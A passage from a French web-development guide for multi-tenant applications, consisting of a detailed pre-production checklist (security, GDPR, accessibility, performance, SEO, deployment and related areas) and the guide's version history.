  prevoir des le depart la suppression/anonymisation complete (RGPD, cf. [2.5](#25-droits-des-personnes-implementation)).
- **« Bruit de voisinage »** : un gros tenant ne doit pas degrader les autres — quotas, pagination
  obligatoire, index sur `tenant_id`, pas de requete non bornee.

---

## 22. Checklist Pre-Production

### Securite

- [ ] Headers HTTP de securite configures (CSP, HSTS, `frame-ancestors`, COOP, `nosniff`)
- [ ] Arbitrage CSP (nonce / hash / `unsafe-inline`) ecrit et motive
- [ ] CORS configure avec whitelist stricte (verifie par une requete reelle sur une route API)
- [ ] Protection CSRF active sur les API Routes
- [ ] Rate limiting actif (routes normales + routes sensibles), **teste en rafale**, avec alerte si son store tombe
- [ ] Isolation tenant sur toutes les requetes en LECTURE comme en ECRITURE (anti-IDOR, filtre dans le `where` de l'ecriture)
- [ ] Garde-fou tenant automatique, qui **leve en dev comme en prod**
- [ ] Controle de role dans chaque action serveur d'ecriture (pas seulement dans l'UI)
- [ ] Middleware non considere comme seule barriere d'acces
- [ ] Validation des entrees sur tous les endpoints (client ET serveur)
- [ ] Upload securise (MIME whitelist + magic bytes, sanitisation, taille max, SVG traite)
- [ ] Fichiers publics ouverts **nommement**, aucun document reel dans `public/`
- [ ] Sanitisation XSS (DOMPurify si contenu riche)
- [ ] Appels sortants proteges contre le SSRF
- [ ] Webhooks : signature verifiee sur le corps brut, idempotence
- [ ] Aucun secret ni donnee personnelle envoye a un service de rendu tiers (QR, images, PDF)
- [ ] Pas de donnees sensibles dans les logs (redaction automatique, zero `console.log`)
- [ ] Politique de mot de passe NIST rev. 4 (longueur, liste de mots de passe compromis, collage autorise)
- [ ] MFA disponible pour les admins (QR genere localement)
- [ ] Secrets differents entre dev et prod, cles a portee minimale
- [ ] HTTPS force (HSTS ; `preload` seulement si tous les sous-domaines sont en HTTPS)
- [ ] Audit des dependances sans vulns high/critical (sortie JSON parsee) + `npm audit signatures`
- [ ] Actions CI epinglees par SHA, `permissions` minimales, secrets au niveau du step
- [ ] Historique Git audite (`gitleaks --log-opts="--all"`) si le depot doit changer de visibilite
- [ ] Variables d'environnement validees **au demarrage** (pas seulement au premier import)
- [ ] Test d'integration multi-tenant sur base ephemere : A ne lit ni ne modifie rien de B (17.9)

### RGPD

- [ ] Bandeau de consentement cookies (pas de tracking avant consentement)
- [ ] Politique de confidentialite a jour
- [ ] Mentions legales completes
- [ ] Procedure droit d'acces (export JSON/CSV)
- [ ] Procedure droit a l'effacement (anonymisation + suppression)
- [ ] Registre des traitements documente
- [ ] DPA avec chaque sous-traitant verifie
- [ ] Durees de conservation definies et implementees (module unique, promesses UI couvertes par un job)
- [ ] Donnees de dev anonymisees (pas de vraies donnees en staging)
- [ ] Bouton « Tout refuser » au meme niveau que « Tout accepter », aucun appel tiers avant consentement (verifie dans l'onglet Reseau)
- [ ] Page legale relue apres la derniere migration d'infrastructure (hebergeur, localisation, sous-traitants)
- [ ] Suppression de compte = anonymisation, sans perte des ecritures a conservation legale

### Mobile & Responsivite

- [ ] Aucun scroll horizontal (tester a 360px et 375px, plus 320px pour le reflow WCAG)
- [ ] Zoom navigateur **non bloque** (pas de `maximum-scale` / `user-scalable=no`)
- [ ] Tous les inputs en 16px minimum (pas de zoom iOS)
- [ ] Touch targets 44x44px minimum (24px plancher WCAG 2.2)
- [ ] `inputMode` et `autocomplete` corrects sur tous les champs
- [ ] Aucune action accessible uniquement au survol
- [ ] `dvh` plutot que `vh` pour les hauteurs plein ecran ; `safe-area-inset` sur les elements fixes en bas
- [ ] Formulaires testes **clavier virtuel ouvert** (bouton de validation atteignable)
- [ ] Largeurs critiques (tableaux, filtres) **mesurees** avec les vraies polices, marge >= 30px au pire cas
- [ ] Modaux scrollables avec overflow correct (`<dialog>` natif de preference)
- [ ] Navigation mobile (burger menu ou tab bar)
- [ ] Date pickers natifs fonctionnels sur iOS et Android
- [ ] Tableaux responsifs (card view ou scroll horizontal)
- [ ] Print stylesheet pour les pages imprimables (factures, rapports)

### UX

- [ ] Etats vides sur toutes les pages de listing
- [ ] Tooltips sur les termes techniques
- [ ] Aide de chaque ecran verifiee contre le code ; test d'invariant « une aide ou une exemption par route »
- [ ] Onboarding pour les nouveaux utilisateurs
- [ ] Feedback visuel sur toutes les actions (loading, succes, erreur)
- [ ] Dark mode fonctionnel (si implemente)
- [ ] Skeleton loaders (pas de spinner plein ecran)

### Accessibilite

- [ ] `lang` sur la balise `<html>`
- [ ] Skip link "Aller au contenu principal"
- [ ] Contrastes WCAG AA (ratio 4.5:1 minimum)
- [ ] `aria-label` sur tous les boutons icone-only
- [ ] Labels lies aux inputs (`for`/`id`)
- [ ] `aria-live` sur les notifications dynamiques
- [ ] Focus trap dans les modales
- [ ] Focus restore apres fermeture de modale
- [ ] `prefers-reduced-motion` respecte
- [ ] `forced-colors` gere (mode contraste eleve Windows)
- [ ] Navigation au clavier fonctionnelle (Echap, Tab, Entree)
- [ ] Structure semantique HTML (main, nav, header, h1-h6)
- [ ] Alternatives textuelles pour les graphiques
- [ ] Test avec axe DevTools sans violation **+ parcours critique au clavier seul et au lecteur d'ecran**
- [ ] Criteres WCAG 2.2 : focus non masque par les elements sticky, alternative au glisser-deposer, aide au meme endroit, pas de ressaisie, connexion sans test cognitif
- [ ] Contraste non textuel 3:1 (bordures d'inputs, icones, focus)
- [ ] Declaration d'accessibilite publiee si le service entre dans le champ de l'EAA

### Performance

- [ ] Core Web Vitals dans le vert **sur donnees terrain, p75 mobile** (LCP < 2.5s, INP < 200ms, CLS < 0.1)
- [ ] Image LCP en eager + `fetchpriority="high"` (jamais `loading="lazy"`)
- [ ] bfcache non bloque sur les pages publiques
- [ ] Aucune reponse personnalisee en cache partage (CDN)
- [ ] Pas de librairie lourde dans le critical path
- [ ] Images optimisees avec `sizes` et formats modernes (WebP/AVIF)
- [ ] Polices limitees (3-4 graisses max)
- [ ] Pagination server-side pour les grandes listes
- [ ] Imports dynamiques avec placeholders CLS-safe
- [ ] Cache headers corrects (immutable pour les assets)

### SEO

- [ ] Favicon PNG 192x192
- [ ] manifest.webmanifest exclu du middleware auth
- [ ] Open Graph images (1200x630px PNG) + Twitter Card
- [ ] Schema.org JSON-LD (Organization, BreadcrumbList)
- [ ] Meta titles et descriptions uniques par page
- [ ] Sitemap dynamique, **sans pages non indexables**, **sans `lastModified`
      recalcule a chaque build**, sans `changefreq`/`priority` inutiles
- [ ] Canonical URLs coherentes (sitemap, liens internes, slash final)
- [ ] robots.txt (sans y bloquer une page qui porte `noindex`)
- [ ] `X-Robots-Tag: noindex` sur tous les domaines de preview/staging
- [ ] Doublons fusionnes par redirection permanente, sans chaine
- [ ] JSON-LD conforme au contenu visible (pas de FAQ/notes/prix absents de la page)

### GEO (moteurs de reponse)

- [ ] Bloc « en bref » : quoi, pour qui, quel resultat, quel prix, **et ce que le
      produit ne fait pas**
- [ ] `llms.txt` a la racine, **liens en syntaxe Markdown**
- [ ] `llms.txt` exclu du middleware **ET** du matcher (deux endroits)
- [ ] Chaque article de fond cite une source institutionnelle HTTPS
- [ ] `citation` du JSON-LD identique aux sources affichees
- [ ] JSON-LD enrichi : `inLanguage`, `audience`, `areaServed`
- [ ] **Aucune contradiction entre JSON-LD, page tarifs et systeme de paiement**
- [ ] Aucune revendication de conformite non auditee (nommer le referentiel, pas
      revendiquer l'alignement)
- [ ] Tests automatises : liens morts, sitemap, llms.txt, sources, coherence prix
- [ ] Politique robots IA decidee et ecrite (recherche autorisee ; entrainement : choix explicite) ;
      WAF/CDN verifie (pas de blocage par defaut non voulu)

### Observabilite

- [ ] Logging structure (JSON, correlation ID)
- [ ] Error tracking configure
- [ ] Uptime monitoring (ping toutes les 5 min)
- [ ] Health check endpoint
- [ ] Alerting configure (SEV1 → SMS, SEV2 → Slack/email)
- [ ] Alertes sur l'**absence** (cron, backup, webhooks silencieux)
- [ ] Health-check des dependances des controles de securite (store du rate limiting, captcha)
- [ ] Metriques business monitorees

### Deploiement

- [ ] Variables d'environnement configurees en prod
- [ ] CI/CD pipeline fonctionnel (lint + types + tests + build)
- [ ] Budget et alertes configures
- [ ] Webhooks de paiement testes
- [ ] Backup DB automatise **et restauration testee** ; export hors fournisseur
- [ ] Procedure de rollback testee
- [ ] Page de maintenance prete
- [ ] Base de dev separee, wrapper qui refuse la prod pour les migrations
- [ ] Migrations en expand/contract ; qui applique la migration prod est annonce avant le merge
- [ ] Checks CI **requis** sur la branche principale ; smoke test post-deploiement

### Maintenabilite

- [ ] Conventional commits configures (commitlint)
- [ ] Pre-commit hooks (husky + lint-staged ou equivalent)
- [ ] Dependabot/Renovate active, avec delai de quarantaine des nouvelles versions
- [ ] Code review checklist partagee avec l'equipe
- [ ] Feature flags pour les fonctionnalites en cours
- [ ] `.gitattributes` (fins de ligne) ; fichiers de configuration locale (outils, agents IA) ignores
- [ ] Fichier de regles pour les agents IA a jour avec les invariants du projet

### Fiabilite des signaux

- [ ] Chaque etape du pipeline confirmee **executee** par son nom, sur le SHA de tete
- [ ] Chaque gate a deja ete vu rougir au moins une fois (test negatif)
- [ ] Aucun `|| true`, aucun `continue-on-error` sur un gate de qualite
- [ ] Aucun job rouge tolere en permanence
- [ ] `@ts-expect-error` partout, zero `@ts-ignore` ; directives `eslint-disable` inutiles signalees
- [ ] Chaque `eslint-disable` est sur la ligne exacte et porte sa raison
- [ ] Les exceptions d'audit (overrides, scopes reduits) sont datees, motivees et contre-verifiees
- [ ] Un controle de securite qui se degrade emet un signal (pas de fail-open silencieux)
- [ ] Les garde-fous levent en dev comme en prod
- [ ] Inventaire des surfaces declaratives (legal, aide, FAQ, JSON-LD, landing, `llms.txt`) relu pour cette version

---

## Historique des Mises a Jour

| Date       | Version | Changements                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ---------- | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 06/11/2026 | 2.10    | Reintegration de la branche parallele v1.3 du 04/07/2026 (money-az, fd-sav-2026 ; son « v1.2 » n'est pas la v1.2 GEO de cette lignee) : profils de projet, hygiene anti-dette des dependances (13.4), 17.7 tester le code genere par IA, 17.8 critere « teste » (et ligne DoD), 17.9 isolation multi-tenant sur base ephemere, section 21 domaines par archetype (paiements, RBAC/SSO/audit, multi-tenant) ; CSP differenciee issue de refuge-des-etoiles (1.2) ; checklist renumerotee 22                                                                                                                                                                                                              |
| 06/11/2026 | 2.9     | Report de la variante generique v2.0 : section 0 (Definition of Done), 1.0 securite par defaut (OWASP Top 10 2025, IDOR en ecriture), NIST 800-63B rev4 + passkeys, CSP/COOP/CORP, rate limiting (cle, fenetre fixe), 1.16 SSRF, 1.17 webhooks, 1.18 services de rendu tiers, supply chain (quarantaine, SHA, permissions) ; 2.11 IA ; 3.16 mesurer le rendu reel, 3.17 dvh/safe-area, mobile natif renumerote 3.18 ; 5.0 WCAG 2.2 + EAA ; INP, 6.11 cout serverless, 7.7 CSS moderne ; 11.8 regles comptables, 11.9 documents generes ; 13.9 agent IA ; 15.7 ; section 16 SEO/GEO (16.7-16.12) ; 18.4 expand/contract, 18.6 base de dev isolee ; 20.9 surfaces declaratives, 20.10 garde-fous dev/prod |
| 06/08/2026 | 2.8     | Nouvelle section 20 « Fiabilite des signaux de controle » (checklist devient 21) ; supply chain npm etendue (1.10.1-1.10.6) ; nouvelle section 1.15 « Historique Git » ; fail-open silencieux (1.5), BOM UTF-8 (1.13), tables partagees cross-tenant (12.1)                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 03/04/2026 | 2.7     | Tenant guard : requetes mixtes OR (tenant+systeme), obligation test build prod sur fichiers infra critiques, liste fichiers infra exigeant validation prod avant merge                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| 29/03/2026 | 2.6     | Ajout section 3.16 (3.18 depuis v2.9) Application Mobile Native (React Native / Expo) : auth securisee, UX native, push notifications, performance, securite, publication EAS, tests mobile                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| 25/03/2026 | 2.5     | Tenant guard ORM middleware, RBAC sur toutes routes d'ecriture, select explicite sur relations include, client admin separe pour cross-tenant                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| 25/03/2026 | 2.4     | Audit pre-prod : PII leak vectors dans logs, rate limiting MFA/magic-link, instrumentation.ts pour env validation, maxDuration serverless                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| 24/03/2026 | 2.3     | Next.js 16 : proxy.ts remplace middleware.ts (build conflict si les deux coexistent)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| 24/03/2026 | 2.2     | Ajout danger Prisma migrate dev drift (reset DB) + workflow migration manuelle securisee                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| 24/03/2026 | 2.1     | Ajout regles cross-platform lint-staged (Windows), migration ESLint v9 flat config                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| 24/03/2026 | 2.0     | Ajout RGPD complet, maintenabilite, i18n, observabilite, incident response, dark mode, accessibilite etendue, securite etendue (CORS, CSRF, rotation secrets, audit deps)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| —          | 1.0     | Version initiale (15 sections)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |

---

> **Ce document est un living document.** Il est automatiquement mis a jour quand une nouvelle regle est decouverte en session de developpement. Consulter l'historique des mises a jour ci-dessus.
